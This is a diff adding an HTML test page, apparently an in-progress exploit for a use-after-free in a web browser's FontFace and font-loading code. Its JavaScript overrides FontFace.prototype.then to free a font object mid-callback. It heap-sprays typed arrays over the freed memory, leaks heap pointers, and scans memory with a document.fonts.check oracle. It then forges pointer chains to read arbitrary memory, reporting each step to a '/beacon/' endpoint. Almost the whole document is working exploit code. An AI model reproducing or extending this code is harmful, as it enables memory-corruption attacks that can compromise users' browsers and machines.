@@ -1,0 +1,248 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>T6d</title></head>
+<body><pre id="O">T6d</pre>
+<script>
+'use strict';
+function bs(t){try{var x=new XMLHttpRequest();x.open('GET','/beacon/T6d-'+encodeURIComponent(t),false);x.send(null);}catch(e){}}
+bs('BOOT');
+var K=512,SZ=192,fired=false,faces=null,AT=0;
+function le(v,o){var x=0n;for(var k=7;k>=0;k--)x=(x<<8n)|BigInt(v[o+k]);return x;}
+function hex(x){return '0x'+x.toString(16);}
+function put64(u,o,x){for(var k=0;k<8;k++){u[o+k]=Number((x>>BigInt(8*k))&0xFFn);}}
+function put32(u,o,x){u[o]=x&0xFF;u[o+1]=(x>>8)&0xFF;u[o+2]=(x>>16)&0xFF;u[o+3]=(x>>24)&0xFF;}
+
+function start(){
+  AT++;if(AT>1)return;
+  try{if(sessionStorage.getItem('uaf')){bs('DOUBLE');return;}sessionStorage.setItem('uaf','1');}catch(e){}
+  var vf;try{vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});}catch(e){return;}
+  try{document.fonts.add(vf);}catch(e){}
+  try{void vf.loaded;}catch(e){}
+  var fs=document.createElement('style');
+  fs.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';
+  document.head.appendChild(fs);
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired)return undefined;fired=true;
+    try{fs.remove();}catch(e){}try{document.fonts.delete(this);}catch(e){}
+    try{document.body.offsetHeight;}catch(e){}
+    window.__sp=[];
+    for(var k=0;k<K;k++){
+      var w=new Uint8Array(new ArrayBuffer(SZ));
+      put32(w,0,0x80000000);put32(w,4,0x1000+k);
+      w[0x82]=3;
+      window.__sp.push(w);
+    }
+    return undefined;
+  },set:function(){}});
+  document.fonts.load('1em vf, v1','AB').then(function(f){faces=f;setTimeout(phase,80);},function(){});
+}
+
+function phase(){
+  var bufs=[],L1=0n,L2=0n;
+  for(var i=0;i<window.__sp.length;i++){
+    var a=le(window.__sp[i],0x58);
+    if(a>0x1000000000n){
+      var b2=le(window.__sp[i],0x68);
+      if(L1===0n){L1=a;L2=b2;}
+      bufs.push([window.__sp[i],b2,i]);
+    }
+  }
+  bs('L1='+hex(L1)+'-L2='+hex(L2)+'-bufs='+bufs.length);
+  if(!bufs.length){bs('NOLEAK');return;}
+  var h0=bufs[0][0];
+
+  // ============================================================
+  // DIAGNOSTIC A: face.status BEFORE Step 2 (spray still has +0x82=3)
+  // If wrapper reads from CSSFontFace, status should reflect spray byte
+  // ============================================================
+  var preStatus=[];
+  for(var ps=0;ps<faces.length;ps++){
+    var s='';try{s=faces[ps].status;}catch(e){s='THROW';}
+    preStatus.push(s);
+  }
+  bs('PRE-STATUS='+preStatus.join(','));
+
+  // Step 2: set spray buffer for oracle
+  for(var ib=0;ib<bufs.length;ib++){
+    var vb=bufs[ib][0];
+    vb[0]=2;put64(vb,0x08,bufs[ib][1]);put64(vb,0x10,0n);vb[0x82]=0;
+  }
+
+  // DIAGNOSTIC B: face.status AFTER Step 2 (h0 +0x82=0 = Loading)
+  var postStatus=[];
+  for(var ps2=0;ps2<faces.length;ps2++){
+    var s2='';try{s2=faces[ps2].status;}catch(e){s2='THROW';}
+    postStatus.push(s2);
+  }
+  bs('POST-STATUS='+postStatus.join(','));
+
+  setTimeout(function(){
+    bs('FACES='+faces.length);
+    for(var i2=0;i2<faces.length;i2++){try{faces[i2].family='zz'+i2;}catch(e){}}
+    for(var i3=0;i3<faces.length;i3++){try{document.fonts.add(faces[i3]);}catch(e){}}
+
+    // DIAGNOSTIC C: face.unicodeRange BEFORE clearing ranges
+    for(var ur=0;ur<faces.length;ur++){
+      var rv='';try{rv=String(faces[ur].unicodeRange);}catch(e){rv='THROW';}
+      bs('UR'+ur+'='+rv);
+    }
+
+    for(var is2=0;is2<bufs.length;is2++){bufs[is2][0][0x28]=0;bufs[is2][0][0x2C]=0;}
+
+    // DIAGNOSTIC D: face.unicodeRange AFTER clearing ranges
+    for(var ur2=0;ur2<faces.length;ur2++){
+      var rv2='';try{rv2=String(faces[ur2].unicodeRange);}catch(e){rv2='THROW';}
+      bs('UR-CLR'+ur2+'='+rv2);
+    }
+
+    // DIAGNOSTIC E: face.status AFTER re-add
+    var addStatus=[];
+    for(var ps3=0;ps3<faces.length;ps3++){
+      var s3='';try{s3=faces[ps3].status;}catch(e){s3='THROW';}
+      addStatus.push(s3);
+    }
+    bs('ADD-STATUS='+addStatus.join(','));
+
+    setTimeout(function(){
+      var chkResults='';
+      for(var q=0;q<faces.length;q++){
+        var r=null;try{r=document.fonts.check('1em zz'+q,'A');}catch(e){r='EX';}
+        chkResults+='zz'+q+'='+r+' ';
+      }
+      bs('CHK='+chkResults.trim());
+
+      var fam=null,zi=-1;
+      for(var q2=0;q2<faces.length;q2++){
+        var r2=null;try{r2=document.fonts.check('1em zz'+q2,'A');}catch(e){r2='EX';}
+        if(r2===false&&zi<0){fam='zz'+q2;zi=q2;}
+      }
+      bs('FAM='+fam+'-zi='+zi);
+      if(!fam){bs('NOTIN');return;}
+
+      h0[0x82]=0;put64(h0,0x20,L1);
+      put32(h0,0x28,1);put32(h0,0x2C,1);
+      put32(h0,0x38,0xBEEF);put32(h0,0x3C,0xBF00);
+
+      function setR(addr){put64(h0,0x20,addr);}
+      function chk(c){try{return document.fonts.check('1em '+fam,String.fromCodePoint(c));}catch(e){return 'EX';}}
+
+      bs('SCAN1');
+      var self=0n;
+      for(var sc=0x1000800000n;sc<0x1002800000n&&!self;sc+=0x80n){
+        setR(sc+0x38n);
+        if(chk(0xBEEF)!==true)continue;
+        if(chk(0xBEEE)!==false)continue;
+        setR(sc+0x6Cn);
+        if(chk(0)===false){self=sc;bs('SELF='+hex(sc));}
+      }
+      if(!self){bs('NOSELF');return;}
+
+      // ============================================================
+      // DIAGNOSTIC F: OFFSET SCAN
+      // Try writing the forge chain start at different offsets
+      // to find which one makes face.style return binary data
+      // ============================================================
+      bs('OFFSET-SCAN');
+
+      // Delete all faces from document.fonts before forging
+      for(var d1=0;d1<faces.length;d1++){
+        try{document.fonts.delete(faces[d1]);}catch(e){}
+      }
+      bs('DEL-ALL');
+
+      var snap=new Uint8Array(SZ);
+      for(var s0=0;s0<SZ;s0++)snap[s0]=h0[s0];
+
+      function dec(s,lim){
+        var by=[],q3=(s.charAt(0)==='"')?1:0,e2=(s.slice(-1)==='"')?s.length-1:s.length,k2=q3;
+        while(k2<e2&&by.length<lim){var ch=s.charAt(k2);
+          if(ch==='\\'){k2++;var hh='';while(k2<e2&&hh.length<6&&/[0-9a-fA-F]/.test(s.charAt(k2))){hh+=s.charAt(k2);k2++;}
+            if(hh.length===0){if(k2<e2){by.push(s.charCodeAt(k2));k2++;}}
+            else{if(s.charAt(k2)===' ')k2++;var cp=parseInt(hh,16);if(cp>255)cp&=0xFF;by.push(cp);}}
+          else{by.push(s.charCodeAt(k2));k2++;}}
+        var hx='';for(var j=0;j<by.length;j++)hx+=('0'+by[j].toString(16)).slice(-2);return hx;
+      }
+
+      // Try each offset as the chain entry point
+      // The chain: CSSFontFace+OFF → self+0x70 → chain → self+0x30 → target
+      var offsets=[0x08,0x10,0x18,0x20,0x28,0x30,0x38,0x40,0x48,0x50,0x58,0x60,0x68];
+      var hitOff=-1;
+      for(var oi=0;oi<offsets.length;oi++){
+        var off=offsets[oi];
+        // Restore all buffers to snap
+        for(var ri=0;ri<window.__sp.length;ri++){
+          var rv=window.__sp[ri];if(!rv)continue;
+          for(var d=0;d<SZ;d++)rv[d]=snap[d];
+        }
+        // Forge: write chain start at THIS offset instead of always +0x08
+        for(var fi=0;fi<window.__sp.length;fi++){
+          var fv=window.__sp[fi];if(!fv)continue;
+          put64(fv,off,self+0x70n);
+          fv[0x10]=0;
+          put32(fv,0x30,4);put32(fv,0x34,80);
+          put64(fv,0x38,L1-0x10n);put32(fv,0x40,4);
+          fv[0x44]=0x7A;fv[0x45]=0x7A;fv[0x46]=0x71;
+          put32(fv,0x70,4);put32(fv,0x74,0x10);
+          fv[0x78]=14;fv[0x79]=0;
+          put64(fv,0x7A,self+0x90n);
+          put32(fv,0x90,3);put32(fv,0x94,72);
+          put64(fv,0x98,self+0x30n);
+        }
+        // Read style from BOTH faces
+        for(var fi2=0;fi2<faces.length;fi2++){
+          var rv2='';
+          try{rv2=dec(String(faces[fi2].style),32);}catch(e){rv2='THROW';}
+          if(rv2!=='THROW'&&rv2.length>20&&hitOff<0){
+            hitOff=off;
+            bs('HIT-off=0x'+off.toString(16)+'-face='+fi2+'-len='+rv2.length+'-d='+rv2.slice(0,40));
+          }
+        }
+      }
+      if(hitOff<0) bs('OFFSET-SCAN-MISS');
+
+      // Also try: face.weight after standard forge
+      for(var ri2=0;ri2<window.__sp.length;ri2++){
+        var rv3=window.__sp[ri2];if(!rv3)continue;
+        for(var d2=0;d2<SZ;d2++)rv3[d2]=snap[d2];
+      }
+      // Standard forge at +0x08
+      for(var fi3=0;fi3<window.__sp.length;fi3++){
+        var fv3=window.__sp[fi3];if(!fv3)continue;
+        put64(fv3,0x08,self+0x70n);fv3[0x10]=0;
+        put32(fv3,0x30,4);put32(fv3,0x34,80);
+        put64(fv3,0x38,L1-0x10n);put32(fv3,0x40,4);
+        fv3[0x44]=0x7A;fv3[0x45]=0x7A;fv3[0x46]=0x71;
+        put32(fv3,0x70,4);put32(fv3,0x74,0x10);
+        fv3[0x78]=14;fv3[0x79]=0;
+        put64(fv3,0x7A,self+0x90n);
+        put32(fv3,0x90,3);put32(fv3,0x94,72);
+        put64(fv3,0x98,self+0x30n);
+      }
+      // Read ALL descriptor properties from both faces
+      for(var fi4=0;fi4<faces.length;fi4++){
+        var props=['style','weight','stretch','unicodeRange','display'];
+        for(var pi=0;pi<props.length;pi++){
+          var pv='';
+          try{pv=String(faces[fi4][props[pi]]);}catch(e){pv='THROW';}
+          // Only beacon if NOT default
+          var defaults={'style':'normal','weight':'normal','stretch':'normal','display':'auto','unicodeRange':'U+41'};
+          if(pv!==defaults[props[pi]]){
+            bs('PROP-f'+fi4+'-'+props[pi]+'='+pv.slice(0,60));
+          }
+        }
+      }
+      bs('PROP-SCAN-DONE');
+
+      // Restore
+      for(var ri3=0;ri3<window.__sp.length;ri3++){
+        var rv4=window.__sp[ri3];if(!rv4)continue;
+        for(var d3=0;d3<SZ;d3++)rv4[d3]=snap[d3];
+      }
+
+      bs('DONE-hitOff='+hitOff);
+      document.getElementById('O').textContent=
+        'T6d '+(hitOff>=0?'HIT off=0x'+hitOff.toString(16):'NO-HIT');
+    },500);
+  },80);
+}
+if(document.readyState==='complete'||document.readyState==='interactive')setTimeout(start,0);
+else document.addEventListener('DOMContentLoaded',start);
+</script></body></html>
